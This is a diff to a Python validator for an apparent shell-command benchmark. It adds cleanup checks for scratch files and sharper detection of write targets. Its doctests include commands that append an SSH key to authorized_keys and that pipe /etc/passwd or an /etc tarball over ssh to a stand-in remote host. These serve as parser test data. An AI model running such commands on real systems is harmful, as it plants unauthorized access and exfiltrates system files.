@@ -28,8 +28,11 @@ Usage:
         module name, not a hostname); side-effect write targets (> >> redirects, tee, cp/mv/
         install destinations, -o/-O/-w/tar -f/of= output values) must live
         under /tmp/qinjing-*, while system trees (/etc /var /root /home
-        /usr /boot) require impact temporary or destructive; and no legacy
-        /tmp/bench- paths.
+        /usr /boot) require impact temporary or destructive; no legacy
+        /tmp/bench- paths; and every real-mode case with a local
+        /tmp/qinjing-* scratch write carries a cleanup (docs/11 T6), so a
+        re-run sweeps its own artifacts (remote ssh/scp writes and read
+        sources are not local scratch writes).
 
     parse.py --tsv <yaml>
         Print runner input TSV: group, id, bucket, bin, cmd. Empty columns
@@ -353,16 +356,45 @@ def _flag_target(cmdword, seg, i):
 
 
 def _write_targets(cmd):
-    """Best-effort write-target operands: > / >> redirects, tee operands,
-    cp/mv/install destinations, and output-flag values. Read operands stay
-    out, so cp /etc/hosts /tmp/x reports only /tmp/x."""
-    targets = [m.group(1) for m in REDIRECT_RE.finditer(cmd)]
+    """Best-effort local write-target operands: > / >> redirects, tee
+    operands, cp/mv/install destinations, mkfifo operands, and output-flag
+    values. Read operands stay out, so cp /etc/hosts /tmp/x reports only
+    /tmp/x. A tee input redirect (< file) is a source, not a target; a
+    redirect inside an ssh/scp remote command lands on the remote host, not
+    locally, so it stays out too (docs/11 T6).
+
+    >>> _write_targets("cp /etc/hosts /tmp/qinjing-x")
+    ['/tmp/qinjing-x']
+    >>> _write_targets("tee -a /home/deploy/.ssh/authorized_keys < /tmp/qinjing-key.pub")
+    ['/home/deploy/.ssh/authorized_keys']
+    >>> _write_targets("ssh user@203.0.113.9 'cat > /tmp/qinjing-data' < /etc/passwd")
+    []
+    >>> _write_targets('tar -cf - /etc | ssh backup@203.0.113.40 "cat > /tmp/qinjing-bkp.tar"')
+    []
+    >>> _write_targets("mkfifo /tmp/qinjing-f")
+    ['/tmp/qinjing-f']
+    """
+    targets = []
     for seg in _segments(cmd):
         head = seg[0]
+        segtext = " ".join(seg)
+        if head in ("ssh", "scp"):
+            segtext = re.sub(r"'[^']*'", " '' ", segtext)
+            segtext = re.sub(r'"[^"]*"', ' "" ', segtext)
+        targets.extend(m.group(1) for m in REDIRECT_RE.finditer(segtext))
         if head in ("cp", "mv", "install") and len(seg) >= 3 \
                 and seg[-1].startswith("/") and not seg[-1].startswith("-"):
             targets.append(seg[-1])
         elif head == "tee":
+            skip = False
+            for tok in seg[1:]:
+                if tok == "<":
+                    skip = True
+                elif skip:
+                    skip = False
+                elif tok.startswith("/"):
+                    targets.append(tok)
+        elif head == "mkfifo":
             targets.extend(t for t in seg[1:] if t.startswith("/"))
         else:
             for j in range(1, len(seg)):
@@ -591,6 +623,15 @@ def validate(cases):
             if case.get("cleanup") and not CLEANUP_RE.match(case["cleanup"]):
                 errors.append("%s: cleanup must be 'rm -f /tmp/qinjing-...' "
                               "(got %r)" % (cid, case["cleanup"]))
+            if case.get("mode") == "real" and not case.get("cleanup"):
+                scratch = sorted({t.rstrip(";'\"") for t in
+                                  _write_targets(case.get("cmd", ""))
+                                  if t.startswith("/tmp/qinjing-")})
+                if scratch:
+                    errors.append("%s: real-mode local scratch write %s "
+                                  "without cleanup (docs/11 T6; add "
+                                  "'rm -f /tmp/qinjing-...')"
+                                  % (cid, ", ".join(scratch)))
             for field in ("expected_signals", "related_signals"):
                 for value in case.get(field, []):
                     if not isinstance(value, str) or not value:
